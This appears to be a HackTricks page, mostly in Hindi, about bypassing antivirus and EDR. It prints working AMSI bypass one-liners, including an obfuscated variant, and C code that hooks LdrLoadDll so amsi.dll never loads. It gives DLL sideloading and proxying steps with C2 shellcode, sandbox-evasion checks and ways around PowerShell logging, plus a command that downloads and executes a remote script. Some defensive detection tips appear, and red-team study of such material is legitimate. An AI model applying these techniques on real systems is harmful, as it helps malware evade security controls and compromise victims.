# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पृष्ठ लिखा गया है** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender को रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने का एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): Windows Defender को काम करने से रोकने के लिए, किसी अन्य AV बनकर फ़ेक करने वाला एक टूल।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

वर्तमान में, AVs यह तय करने के लिए अलग-अलग तरीके इस्तेमाल करते हैं कि कोई फ़ाइल malicious है या नहीं — static detection, dynamic analysis, और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection तब होती है जब बाइनरी या स्क्रिप्ट में ज्ञात malicious strings या byte arrays को flag किया जाता है, और फ़ाइल से खुद जानकारी निकाली जाती है (जैसे file description, company name, digital signatures, icon, checksum, आदि)। इसका मतलब है कि public रूप से मौजूद tools का इस्तेमाल आपको जल्दी पकड़ा सकता है, क्योंकि उन्हें संभवतः पहले ही analyze करके malicious के रूप में flag किया जा चुका है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप बाइनरी को encrypt कर दें, तो AV के लिए आपका प्रोग्राम detect करना मुश्किल होगा, लेकिन आपको इसे memory में decrypt करके रन करने के लिए किसी तरह का loader चाहिए होगा।

- **Obfuscation**

कभी-कभी बस अपनी बाइनरी या स्क्रिप्ट में कुछ strings बदल देने से AV को चकma दिया जा सकता है, लेकिन यह काम उस चीज़ पर निर्भर करते हुए समय लेने वाला हो सकता है जिसे आप obfuscate करना चाहते हैं।

- **Custom tooling**

अगर आप अपने खुद के tools विकसित करते हैं, तो कोई known bad signature नहीं होगा, लेकिन यह बहुत समय और मेहनत लेता है।

> [!TIP]
> Windows Defender की static detection के खिलाफ चेक करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह मूलतः फ़ाइल को कई segments में बाँटता है और फिर Defender से हर segment को अलग से scan करने को कहता है — इस तरह यह आपको बता सकता है कि आपकी बाइनरी में कौन-सी exact strings या bytes flag हो रही हैं।

मैं आपको यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) practical AV Evasion के बारे में जरूर देखने की सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis वह है जब AV आपकी बाइनरी को sandbox में रन कर के malicious activity को observe करता है (उदाहरण के लिए browser के passwords decrypt करके पढ़ने की कोशिश करना, LSASS पर minidump करना, आदि)। यह हिस्सा थोड़ा मुश्किल हो सकता है, पर यहाँ कुछ तरीके हैं जिनसे आप sandboxes से बच सकते हैं।

- **Sleep before execution**  
  यह AV के dynamic analysis को bypass करने का एक अच्छा तरीका हो सकता है, यह इस पर निर्भर करता है कि यह कैसे implement किया गया है। AVs के पास फ़ाइलों को scan करने का बहुत छोटा समय होता है ताकि उपयोगकर्ता का workflow बाधित न हो, इसलिए लंबे sleeps analysis को प्रभावित कर सकते हैं। समस्या यह है कि कई AV के sandboxes sleep को skip कर सकते हैं, यह implementation पर निर्भर करता है।

- **Checking machine's resources**  
  आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (उदा. < 2GB RAM), अन्यथा वे उपयोगकर्ता की मशीन को धीमा कर देंगे। आप यहाँ काफी creative हो सकते हैं, उदाहरण के लिए CPU का temperature या fan speeds चेक करना — sandbox में हर चीज़ implement नहीं होती।

- **Machine-specific checks**  
  अगर आप किसी ऐसे user को target करना चाहते हैं जिसकी workstation "contoso.local" domain से जुड़ी है, तो आप कंप्यूटर के domain की जांच कर सकते हैं; अगर यह मैच नहीं करता, तो आपका प्रोग्राम exit कर सकता है।

यह पता चला है कि Microsoft Defender के Sandbox का computername HAL9TH है, तो आप अपने malware में detonation से पहले computer name की जाँच कर सकते हैं — अगर नाम HAL9TH से मैच करता है, तो आप Defender के sandbox के अंदर हैं, और आप अपना प्रोग्राम exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ जाने के लिए [@mgeeky](https://twitter.com/mariuszbit) की कुछ और बढ़िया टिप्स

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने पहले कहा, **public tools** अंततः **detect हो ही जाते हैं**, तो आपको अपने आप से यह सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS को dump करना चाहते हैं, **क्या आपको वाकई mimikatz इस्तेमाल करना ही चाहिए**? या क्या आप किसी अलग, कम-प्रसिद्ध प्रोजेक्ट का उपयोग कर सकते हैं जो LSASS भी dump कर देता हो।

सही जवाब शायद बाद वाला है। mimikatz जैसे प्रोजेक्ट को लीजिए — यह शायद AVs और EDRs द्वारा flag किए जाने वाला सबसे अधिक ज्ञात टूलों में से एक है; जबकि प्रोजेक्ट खुद शानदार है, इसे AVs से बचाने के लिए उसके साथ काम करना एक दुःस्वप्न हो सकता है, इसलिए जो आप हासिल करना चाहते हैं उसके लिए alternatives ढूँढें।

> [!TIP]
> जब आप अपने payloads को evasion के लिए modify कर रहे हों, तो सुनिश्चित करें कि Defender में **automatic sample submission** बंद हो, और कृपया, गंभीरता से, **DO NOT UPLOAD TO VIRUSTOTAL** अगर आपका लक्ष्य long-term evasion है। अगर आप यह चेक करना चाहते हैं कि किसी particular AV द्वारा आपका payload detect होता है या नहीं, तो उसे एक VM पर install करके automatic sample submission बंद करने की कोशिश करें, और वहाँ तब तक टेस्ट करें जब तक आप नाखुश न हों।

## EXEs vs DLLs

जहाँ भी संभव हो, evasion के लिए हमेशा **DLLs का उपयोग प्राथमिकता दें** — मेरे अनुभव में, DLL फ़ाइलें आमतौर पर **काफ़ी कम detect** और analyze होती हैं, इसलिए कुछ मामलों में यह detection से बचने के लिए एक बहुत सरल चाल है (बशर्ते आपका payload किसी तरह DLL के रूप में चल सके)।

जैसा कि इस इमेज में दिखता है, Havoc का एक DLL Payload antiscan.me पर 4/26 detection rate दिखा रहा है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ tricks दिखाएँगे जो आप DLL फाइलों के साथ उपयोग करके और भी ज्यादा stealthy हो सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा उपयोग किए जाने वाले DLL search order का लाभ उठाता है, जिसमें victim application और malicious payload(s) को एक साथ रखा जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित powershell script का उपयोग करके DLL Sideloading के प्रति susceptible प्रोग्राम्स जांच सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

मैं दृढ़ता से सुझाव देता/देती हूँ कि आप **DLL Hijackable/Sideloadable programs को स्वयं एक्सप्लोर करें**, यह तकनीक सही तरीके से करने पर काफी stealthy होती है, लेकिन यदि आप सार्वजनिक रूप से ज्ञात DLL Sideloadable programs का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

केवल उस नाम से एक malicious DLL रख देने से, जिसे कोई program लोड करने की अपेक्षा करता है, आपका payload चल नहीं पाएगा, क्योंकि program उस DLL के अंदर कुछ विशिष्ट functions की अपेक्षा करता है; इस समस्या को हल करने के लिए हम एक अन्य technique जिसका नाम है **DLL Proxying/Forwarding** का उपयोग करेंगे।

**DLL Proxying** proxy (और malicious) DLL से program द्वारा किए गए calls को original DLL तक forward करता है, इस तरह program की functionality बनी रहती है और यह आपके payload के execution को संभालने में सक्षम होता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग करूँगा, जो [@flangvik](https://twitter.com/Flangvik/) का प्रोजेक्ट है।

मैंने जिन चरणों का पालन किया वे हैं:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
आखिरी कमांड हमें 2 फ़ाइलें देगा: एक DLL source code template, और मूल रूप से नाम बदली हुई DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **दृढ़ता से सलाह देता हूँ** कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) जो DLL Sideloading के बारे में है देखें और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें ताकि जो हमने चर्चा की है उसे और गहराई से समझ सकें।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules उन functions को export कर सकते हैं जो वास्‍तव में "forwarders" होते हैं: code की ओर संकेत करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller export को resolve करता है, तो Windows loader निम्न करेगा:

- यदि `TargetDll` पहले से लोड नहीं है तो Load `TargetDll`
- उससे `TargetFunc` को Resolve करेगा

समझने के लिए प्रमुख व्यवहार:
- यदि `TargetDll` एक KnownDLL है, तो यह protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32) से प्रदान किया जाता है।
- यदि `TargetDll` KnownDLL नहीं है, तो सामान्य DLL search order उपयोग किया जाता है, जिसमें उस module की directory शामिल है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive सक्षम करता है: एक signed DLL ढूंढें जो किसी non-KnownDLL module नाम की ओर forwarded function export करती हो, फिर उस signed DLL को उसी directory में रखें जहाँ attacker-controlled DLL हो जिसका नाम forwarded target module के नाम के बिल्कुल समान हो। जब forwarded export invoke किया जाता है, loader forward को resolve करके आपकी DLL को उसी directory से लोड करेगा और आपकी DllMain को execute करेगा।

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम के माध्यम से हल किया जाता है.

PoC (कॉपी-पेस्ट):
1) साइन किया गया सिस्टम DLL एक writable फ़ोल्डर में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक दुष्ट `NCRYPTPROV.dll` रखें। एक न्यूनतम DllMain ही कोड निष्पादन के लिए पर्याप्त है; DllMain को ट्रिगर करने के लिए आपको forwarded function को implement करने की ज़रूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) साइन किए गए LOLBin के साथ forward को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
प्रेक्षित व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को लोड करता है
- `KeyIsoSetAuditingInterface` को रिज़ॉल्व करते समय, लोडर फ़ॉरवर्ड को `NCRYPTPROV.SetAuditingInterface` की ओर फॉलो करता है
- फिर लोडर `C:\test` से `NCRYPTPROV.dll` को लोड करता है और इसके `DllMain` को निष्पादित करता है
- अगर `SetAuditingInterface` इम्प्लीमेंट नहीं है, तो आपको "missing API" त्रुटि केवल तब मिलेगी जब `DllMain` पहले ही चल चुका होगा

हंटिंग टिप्स:
- उन forwarded exports पर ध्यान दें जहाँ target module KnownDLL नहीं है। KnownDLLs सूचीबद्ध होते हैं: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- आप forwarded exports को enumerate करने के लिए निम्न टूलिंग का उपयोग कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवारों की खोज के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins (उदा., rundll32.exe) की निगरानी करें जो non-system paths से signed DLLs लोड कर रहे हों, और फिर उसी डायरेक्टरी से उसी बेस नाम के non-KnownDLLs को लोड कर रहे हों
- निम्नलिखित process/module चेन पर अलर्ट करें: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` (यूज़र-लेखनीय पाथ्स के अंतर्गत)
- कोड इंटीग्रिटी नीतियों (WDAC/AppLocker) को लागू करें और application डायरेक्ट्रीज़ में write+execute को निषेध करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपने shellcode को छिपे हुए तरीके से लोड और execute करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> एवेशन केवल एक बिल्ली और चूहे का खेल है — जो आज काम करता है, वह कल पकड़ में आ सकता है। इसलिए कभी केवल एक ही टूल पर निर्भर न रहें; अगर संभव हो तो कई एवेशन तकनीकों को जोड़कर प्रयोग करें।

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" से बचाव के लिए बनाया गया था। शुरू में, AVs केवल **files on disk** को स्कैन करने में सक्षम थे, इसलिए अगर आप किसी तरह payloads को **directly in-memory** निष्पादित कर लेते थे, तो AV कुछ भी रोक नहीं पाता था क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus समाधानों को स्क्रिप्ट सामग्री को unencrypted और unobfuscated रूप में एक्सपोज़ करके स्क्रिप्ट के व्यवहार का निरीक्षण करने की अनुमति देता है।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को prepend करता है और फिर उस executable का path दिखाता है जिससे स्क्रिप्ट चली थी — इस मामले में, powershell.exe

हमने डिस्क पर कोई फाइल ड्रॉप नहीं की, फिर भी AMSI के कारण in-memory में पकड़े गए।

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

AMSI को बायपास करने के कुछ तरीके हैं:

- **Obfuscation**

चूँकि AMSI मुख्य रूप से static detections के साथ काम करता है, इसलिए उन स्क्रिप्ट्स को मॉडिफ़ाई करना जिन्हें आप लोड करने की कोशिश करते हैं, detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI में scripts को unobfuscate करने की क्षमता होती है भले ही उनमें कई लेयर्स हों, इसलिए obfuscation बुरा विकल्प हो सकता है — यह इस बात पर निर्भर करता है कि इसे कैसे किया गया है। इससे इसे evade करना सीधा-सादा नहीं रहता। हालांकि कभी-कभी बस कुछ variable नाम बदलने भर से काम चल जाता है, तो यह इस बात पर निर्भर करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

चूँकि AMSI को powershell (साथ ही cscript.exe, wscript.exe, आदि) प्रोसेस में एक DLL लोड करके लागू किया जाता है, इसलिए इसे unprivileged user के रूप में भी आसानी से टेम्पर किया जा सकता है। AMSI की इस implementation में दोष के कारण researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail करवा देना (amsiInitFailed) इस परिणाम में होगा कि current process के लिए कोई scan initiated नहीं होगा। मूल रूप से यह [Matt Graeber](https://twitter.com/mattifestation) द्वारा खुलासा किया गया था और Microsoft ने व्यापक उपयोग को रोकने के लिए एक signature विकसित किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
एक ही लाइन powershell कोड ने वर्तमान powershell प्रोसेस के लिए AMSI को अनुपयोगी बना दिया। यह लाइन स्वाभाविक रूप से AMSI द्वारा फ़्लैग कर दी गई थी, इसलिए इस तकनीक का उपयोग करने के लिए कुछ संशोधन आवश्यक हैं।

यहाँ एक संशोधित AMSI bypass है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> कृपया अधिक विस्तृत व्याख्या के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

क्रियान्वयन रूपरेखा (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- यह PowerShell, WScript/CScript और custom loaders पर समान रूप से काम करता है (वह कोई भी चीज़ जो अन्यथा AMSI लोड करती है)।
- stdin पर स्क्रिप्ट भेजने के साथ जोड़ें (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ताकि लंबे कमांड‑लाइन अवशेषों से बचा जा सके।
- LOLBins के जरिए निष्पादित loaders द्वारा इस्तेमाल देखा गया है (उदा., `regsvr32` द्वारा `DllRegisterServer` कॉल)।

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**पहचान किए गए सिग्नेचर को हटाएँ**

आप वर्तमान प्रक्रिया की मेमोरी से पहचानी गई AMSI सिग्नेचर को हटाने के लिए ऐसे टूल्स का उपयोग कर सकते हैं जैसे **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**। यह टूल वर्तमान प्रक्रिया की मेमोरी में AMSI सिग्नेचर को स्कैन करके उसे NOP instructions से ओवरराइट कर देता है, जिससे वह मेमोरी से प्रभावी रूप से हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR उत्पाद**

AMSI का उपयोग करने वाले AV/EDR उत्पादों की सूची आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** पर पा सकते हैं।

**PowerShell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं तो AMSI लोड नहीं होगा, इसलिए आप अपनी स्क्रिप्ट्स को AMSI द्वारा स्कैन किए बिना चला पाएंगे। आप यह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS लॉगिंग

PowerShell logging एक ऐसी विशेषता है जो किसी सिस्टम पर चलाए गए सभी PowerShell कमांड्स को लॉग करने की अनुमति देती है। यह ऑडिटिंग और समस्या निवारण के लिए उपयोगी हो सकता है, लेकिन उन attackers के लिए भी यह एक समस्या साबित हो सकता है जो detection से बचना चाहते हैं।

To bypass PowerShell logging, आप निम्न तकनीकों का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इस उद्देश्य के लिए ऐसे टूल का उपयोग कर सकते हैं जैसे [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)।
- **Use Powershell version 2**: यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने scripts बिना AMSI द्वारा scan हुए चला सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करके defenses के बिना एक powershell spawn करें (यही वह चीज़ है जो `powerpick` from Cobal Strike उपयोग करता है)।

## Obfuscation

> [!TIP]
> कई obfuscation techniques डेटा को encrypt करने पर निर्भर करती हैं, जिससे बाइनरी की entropy बढ़ जाती है और AVs तथा EDRs के लिए इसे detect करना आसान हो जाता है। इस बात का ध्यान रखें और संभव हो तो encryption केवल कोड के उन हिस्सों पर लागू करें जो sensitive हैं या जिन्हें छिपाने की जरूरत है।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब आप ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का विश्लेषण करते हैं, तो अक्सर कई सुरक्षा परतों का सामना होता है जो decompilers और sandboxes को ब्लॉक कर देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से लगभग-ओरिजिनल IL को पुनर्स्थापित करता है जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और इसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है इसलिए कोई संशोधन binary को क्रैश कर देगा। encrypted metadata tables locate करने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) शामिल होते हैं जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फ़ाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को दें:
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 प्रोफ़ाइल चुनें  
• de4dot control-flow flattening को रिवर्स करेगा, original namespaces, classes और variable names को restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को lightweight wrappers (a.k.a *proxy calls*) से बदल देता है ताकि decompilation और अधिक टूटे। इन्हें हटाने के लिए **ProxyCall-Remover** का उपयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस चरण के बाद आप opaque wrapper functions (`Class8.smethod_10`, …) की जगह सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` देखेंगे।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग के लिए खोजें ताकि असली payload का पता चल सके। अक्सर malware इसे `<Module>.byte_0` के अंदर TLV-encoded byte array के रूप में स्टोर करता है।

ऊपर दिया गया chain execution flow को पुनर्स्थापित करता है **बिना** malicious sample को चलाए — यह offline workstation पर काम करते समय उपयोगी होता है।

> 🛈  ConfuserEx एक custom attribute उत्पन्न करता है जिसका नाम `ConfusedByAttribute` है, जिसे IOC के रूप में उपयोग करके samples को automatic triage करने में मदद मिल सकती है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है जो software security बढ़ाने के लिए [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing सक्षम करे।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator यह दिखाता है कि `C++11/14` भाषा का उपयोग करके, compile time पर, किसी external tool का उपयोग किए बिना और compiler को संशोधित किए बिना obfuscated code कैसे जनरेट किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा जनरेट किए गए obfuscated operations की एक परत जोड़ता है जो application को crack करने वाले व्यक्ति के लिए काम थोड़ा कठिन बना देगी।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो विभिन्न PE फाइलों को obfuscate कर सकता है, जिनमें .exe, .dll, .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक सादा metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक fine-grained code obfuscation framework है जो LLVM-supported भाषाओं के लिए ROP (return-oriented programming) का उपयोग करता है। ROPfuscator किसी प्रोग्राम को assembly code स्तर पर obfuscate करता है, सामान्य instructions को ROP chains में परिवर्तित करके सामान्य control flow की हमारी धारणा को विफल कर देता है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt एक .NET PE Crypter है जो Nim में लिखा गया है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में बदलने और फिर उन्हें लोड करने में सक्षम है

## SmartScreen & MoTW

आपने यह स्क्रीन तब देखा होगा जब इंटरनेट से कुछ executables डाउनलोड करके उन्हें चलाया जाता है।

Microsoft Defender SmartScreen एक security mechanism है जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्यतः एक reputation-based approach से काम करता है, जिसका मतलब है कि कम बार डाउनलोड होने वाले applications SmartScreen को trigger करेंगे और end user को फ़ाइल चलाने से पहले alert और रोक देंगे (हालाँकि फ़ाइल को More Info -> Run anyway पर क्लिक करके फिर भी चलाया जा सकता है)।

